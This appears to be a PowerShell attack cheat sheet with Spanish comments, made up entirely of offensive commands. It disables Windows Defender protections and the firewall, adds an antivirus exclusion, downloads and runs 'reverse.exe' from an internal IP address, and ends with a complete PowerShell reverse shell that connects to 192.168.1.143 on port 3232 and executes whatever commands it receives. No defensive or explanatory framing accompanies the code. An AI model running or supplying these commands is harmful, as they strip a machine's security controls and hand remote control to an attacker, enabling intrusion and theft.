#Desactivar Monitorización de Windows Defender (no 100%).
Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ;Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:USERPROFILE\Desktop\rs.exe"; powershell "$env:USERPROFILE\Desktop\rs.exe"

#Desactivar Firewall
netsh advfirewall set allprofiles state off


Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.1.143',3232));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex ". { $data } 2>&1" | Out-String ); Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
